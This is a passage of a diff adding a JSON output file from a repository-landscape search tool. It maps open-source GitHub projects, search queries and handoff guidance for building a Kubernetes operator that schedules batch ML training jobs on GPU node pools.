structure of any workload type into a standard schema. Using JQ-based path expressions...",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "custom resource definition"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.1,
+        "pattern_family": "framework",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/venkateswarluvajrala/MLpad",
+        "url": "https://github.com/venkateswarluvajrala/MLpad",
+        "owner": "venkateswarluvajrala",
+        "name": "MLpad",
+        "description": "A CLI tool to manage MLOps workflows on Kubernetes using custom operators. It simplifies the creation, deployment, and monitoring of machine learning notebooks, training jobs, and model artifacts in a Kubernetes-native way.",
+        "language": "Python",
+        "topics": [],
+        "readme": "MLpad\n\nMLpad is a CLI tool designed to streamline MLOps workflows on Kubernetes using custom operators. It simplifies the\ncreation, deployment, and monitoring of machine learning notebooks, training jobs, and model artifacts in a\nKubernetes-native way.\n\nFeatures\n\n**Notebook Creation**: Easily create and manage code server notebooks within Kubernetes.\n**Training Jobs**: Define and run training jobs with custom configurations.\n**Model Artifacts**: Manage model artifacts efficiently (under development).\n**Monitoring**: Monitor the status of your MLOps workflows (under development).\n**Model Serving**: Expose models as APIs (under development).",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "ml training operator"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.05,
+        "pattern_family": "orchestrator",
+        "pattern_family_source": "lexicon-stage2"
+      },
+      {
+        "id": "https://github.com/tttinhtech-hash/devops-project-iac",
+        "url": "https://github.com/tttinhtech-hash/devops-project-iac",
+        "owner": "tttinhtech-hash",
+        "name": "devops-project-iac",
+        "description": "This project builds a production-grade CI/CD system on AWS EKS. Infra is managed by Terraform (S3/DDB). Zero Trust access uses SSM (No SSH). Ansible Dynamic Inventory handles configuration. Jenkins uses EKS Pod Agents for scaling. Images stored in ECR. Deployment via Helm. Cost optimized by Spot Instances. Monitored using Prometheus/Grafana",
+        "language": "HCL",
+        "topics": [],
+        "readme": "DevOps Production-Ready Project\n\nFull-stack DevOps infrastructure with Terraform, Kubernetes, CI/CD, and Monitoring.\n\n🏗️ Project Structure\n \n\n🚀 Technologies\n\n**IaC:** Terraform\n**Container:** Docker + Amazon ECR\n**Orchestration:** Kubernetes (EKS)\n**CI/CD:** Jenkins\n**Monitoring:** Prometheus + Grafana + Loki\n**Secrets:** AWS Secrets Manager + External Secrets Operator\n**Networking:** AWS VPC, ALB, Ingress",
+        "license": null,
+        "dependencies": [],
+        "discoveryProvenance": [
+          "spot instance handling"
+        ],
+        "enrichment_incomplete": false,
+        "enrichment_error": null,
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.05,
+        "pattern_family": "orchestrator",
+        "pattern_family_source": "lexicon-stage2"
+      }
+    ]
+  },
+  "selection": {
+    "by_score": 10,
+    "by_divergence": 0,
+    "diversity_gap": null,
+    "note": null
+  },
+  "seed_strategy": "auto",
+  "seed_diversification": {
+    "seeds": [
+      "kubernetes operator",
+      "kubebuilder",
+      "batch job scheduling",
+      "gpu scheduler",
+      "ml training operator",
+      "custom resource definition",
+      "controller runtime",
+      "spot instance handling",
+      "pod disruption budget"
+    ],
+    "added": [],
+    "strategy": "passthrough",
+    "reason": "already_diverse",
+    "diversity_before": {
+      "seed_count": 9,
+      "orthogonal_count": 9,
+      "max_pairwise_jaccard": 0.333,
+      "threshold": 0.5
+    },
+    "diversity_after": {
+      "seed_count": 9,
+      "orthogonal_count": 9,
+      "max_pairwise_jaccard": 0.333,
+      "threshold": 0.5
+    }
+  },
+  "pattern_family_strategy": "auto",
+  "pattern_family_summary": {
+    "strategy": "auto",
+    "project_override_count": 0,
+    "total": 20,
+    "classified": 14,
+    "unknown": 6,
+    "classified_ratio": 0.7
+  },
+  "enrichment_health": {
+    "total": 164,
+    "incomplete": 0,
+    "incomplete_ratio": 0,
+    "throttle_ms": 1000
+  },
+  "queryPlans": [
+    {
+      "label": "Query 2",
+      "query": "kubebuilder",
+      "reasons": [
+        "Nimmt Tech-Tag \"kubebuilder\" mit",
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Kurze Query — breite Abdeckung, ggf. zu generisch"
+      ],
+      "hitCount": 9
+    },
+    {
+      "label": "Query 1",
+      "query": "kubernetes operator",
+      "reasons": [
+        "Nimmt Tech-Tag \"kubernetes\" mit",
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Kurze Query — breite Abdeckung, ggf. zu generisch"
+      ],
+      "hitCount": 3
+    },
+    {
+      "label": "Query 7",
+      "query": "controller runtime",
+      "reasons": [
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Kurze Query — breite Abdeckung, ggf. zu generisch"
+      ],
+      "hitCount": 2
+    },
+    {
+      "label": "Query 3",
+      "query": "batch job scheduling",
+      "reasons": [
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Mehrwort-Query — praezisere Treffer, geringere Trefferquote"
+      ],
+      "hitCount": 1
+    },
+    {
+      "label": "Query 4",
+      "query": "gpu scheduler",
+      "reasons": [
+        "Nimmt Tech-Tag \"gpu\" mit",
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Kurze Query — breite Abdeckung, ggf. zu generisch"
+      ],
+      "hitCount": 1
+    },
+    {
+      "label": "Query 5",
+      "query": "ml training operator",
+      "reasons": [
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Mehrwort-Query — praezisere Treffer, geringere Trefferquote"
+      ],
+      "hitCount": 1
+    },
+    {
+      "label": "Query 6",
+      "query": "custom resource definition",
+      "reasons": [
+        "Trifft Approach-Signature \"custom-resource-definition\"",
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Mehrwort-Query — praezisere Treffer, geringere Trefferquote"
+      ],
+      "hitCount": 1
+    },
+    {
+      "label": "Query 8",
+      "query": "spot instance handling",
+      "reasons": [
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Mehrwort-Query — praezisere Treffer, geringere Trefferquote"
+      ],
+      "hitCount": 1
+    },
+    {
+      "label": "Query 9",
+      "query": "pod disruption budget",
+      "reasons": [
+        "OpenSource-Filter wird in der Rangierung beruecksichtigt",
+        "Mehrwort-Query — praezisere Treffer, geringere Trefferquote"
+      ],
+      "hitCount": 1
+    }
+  ],
+  "agentView": {
+    "mission": [
+      "Externe Loesungsraum-Landkarte fuer \"We need a Kubernetes operator that schedules and manages batch ML training jobs across heterogeneous GPU node pools\" ins Zielprojekt cross-domain-test ueberfuehren",
+      "Divergente Cluster (4) pruefen — hoeheres Lernpotenzial, hoeherer Transfer-Aufwand",
+      "Keine benachbarten Cluster — Adaptions-Pfad unklar, Datenbasis pruefen"
+    ],
+    "deliverable": [
+      "Je Cluster ein Kurz-Exposé mit Key-Takeaway fuer das Zielprojekt",
+      "Pro divergentem Cluster eine klare adopt/adapt/observe/ignore-Entscheidung",
+      "Decision-Log-Eintrag(e) im Zielprojekt, die auf diese Landscape referenzieren"
+    ],
+    "priorityRepos": [
+      {
+        "repo": "GeiserX/redis-operator",
+        "action": "Als divergente Referenz fuer \"kubebuilder+controller+k8s-sig-api-machinery\" pruefen",
+        "url": "https://github.com/GeiserX/redis-operator"
+      },
+      {
+        "repo": "k-krew/omen",
+        "action": "Als divergente Referenz fuer \"kubernetes-operator+helm+kubebuilder\" pruefen",
+        "url": "https://github.com/k-krew/omen"
+      },
+      {
+        "repo": "dixudx/yacht",
+        "action": "Als divergente Referenz fuer \"framework+describe+inference\" pruefen",
+        "url": "https://github.com/dixudx/yacht"
+      },
+      {
+        "repo": "venkateswarluvajrala/MLpad",
+        "action": "Als divergente Referenz fuer \"orchestrator+creation+monitoring\" pruefen",
+        "url": "https://github.com/venkateswarluvajrala/MLpad"
+      }
+    ],
+    "context": [
+      "Aktueller Ansatz: - Manual ad-hoc Job objects with init-containers\n- Spot-instance handling via raw nodeSelector annotations\n- Checkpoint logic implemented in user training scripts",
+      "Erfolgskriterium: Custom Resource Definition for a TrainingJob type,Node-affinity selection by GPU memory + architecture,Checkpoint persistence with restart-from-checkpoint,Cost-aware spot-instance preference with graceful preemption handling,Operator follows KubeBuilder/Operator-SDK conventions",
+      "Approach-Signature: custom-resource-definition, controller-pattern, node-affinity, gpu-scheduling, spot-preemption, checkpoint-persistence",
+      "Tech-Tags: kubernetes, k8s, golang, kubebuilder, operator-sdk, controller-runtime"
+    ],
+    "guardrails": [
+      "Go-based operator, KubeBuilder framework",
+      "Open-source license (Apache-2.0 preferred)",
+      "Must work with multi-cloud (AWS, GCP, Azure)"
+    ],
+    "uncertainties": [
+      "Nicht-Ziel: Replacing Kubeflow's full pipeline architecture",
+      "Nicht-Ziel: Building a model-registry on top",
+      "Nicht-Ziel: Inference-serving (separate concern)"
+    ],
+    "codingStarter": {
+      "primary": {
+        "repo": "GeiserX/redis-operator",
+        "starterLabel": "adapters/provenance|kubebuilder-bridge.mjs",
+        "implementationGoal": "Adaptions-Skizze fuer Cluster \"kubebuilder+controller+k8s-sig-api-machinery\" als Bruecke zum Zielprojekt",
+        "firstSlice": "Minimal-Integration: 1 Vertreter aus Cluster \"kubebuilder+controller+k8s-sig-api-machinery\" gegen das Zielprojekt testen",
+        "targetAreas": [
+          "problem_lens"
+        ],
+        "starterMode": "exploration",
+        "compareChecklist": [
+          "Wie unterscheidet sich dieser divergente Ansatz vom aktuellen Stand?",
+          "Welche Annahmen des aktuellen Ansatzes stellt dieses Cluster in Frage?",
+          "Ist der Transfer-Aufwand in Relation zum erwarteten Gewinn vertretbar?"
+        ],
+        "stopIf": [
+          "Performance oder Qualitaet unter dem aktuellen Niveau ohne klare Perspektive",
+          "Lizenz oder Distributionsform passt nicht zum Zielprojekt"
+        ]
+      },
+      "secondary": [
+        {
+          "repo": "k-krew/omen",
+          "starterLabel": "adapters/provenance|kubernetes-operator-bridge.mjs",
+          "implementationGoal": "Alternativer Pfad aus Cluster \"kubernetes-operator+helm+kubebuilder\"",
+          "firstSlice": "Kurzvergleich gegen primaeren Pfad",
+          "targetAreas": [
+            "problem_lens"
+          ],
+          "starterMode": "exploration",
+          "compareChecklist": [
+            "Wo unterscheidet sich dieser Pfad vom primaeren?"
+          ],
+          "stopIf": [
+            "Keine klaren Unterschiede zum primaeren Pfad"
+          ]
+        },
+        {
+          "repo": "dixudx/yacht",
+          "starterLabel": "adapters/framework|unknown-bridge.mjs",
+          "implementationGoal": "Alternativer Pfad aus Cluster \"framework+describe+inference\"",
+          "firstSlice": "Kurzvergleich gegen primaeren Pfad",
+          "targetAreas": [
+            "unknown"
+          ],
+          "starterMode": "exploration",
+          "compareChecklist": [
+            "Wo unterscheidet sich dieser Pfad vom primaeren?"
+          ],
+          "stopIf": [
+            "Keine klaren Unterschiede zum primaeren Pfad"
+          ]
+        }
+      ]
+    },
+    "payload": {
+      "schemaVersion": "2",
+      "handoffType": "landscape-to-project",
+      "problemSlug": "kubernetes-operator-for-batch-ml-training-jobs",
+      "project": "cross-domain-test",
+      "relationCounts": {
+        "divergent": 4,
+        "adjacent": 0,
+        "near_current_approach": 0
+      }
+    },
+    "downloadFileName": "patternpilot-landscape-handoff-kubernetes-operator-for-batch-ml-training-jobs.json",
+    "references": [
+      "Query: \"kubebuilder\"",
+      "Query: \"kubernetes operator\"",
+      "Query: \"controller runtime\"",
+      "Query: \"batch job scheduling\""
+    ]
+  },
+  "techStatus": {
+    "effectiveQueries": [
+      "kubernetes operator",
+      "kubebuilder",
+      "batch job scheduling",
+      "gpu scheduler",
+      "ml training operator",
+      "custom resource definition",
+      "controller runtime",
+      "spot instance handling",
+      "pod disruption budget"
+    ],
+    "missingCandidates": [],
+    "searchErrors": []
+  }
+}
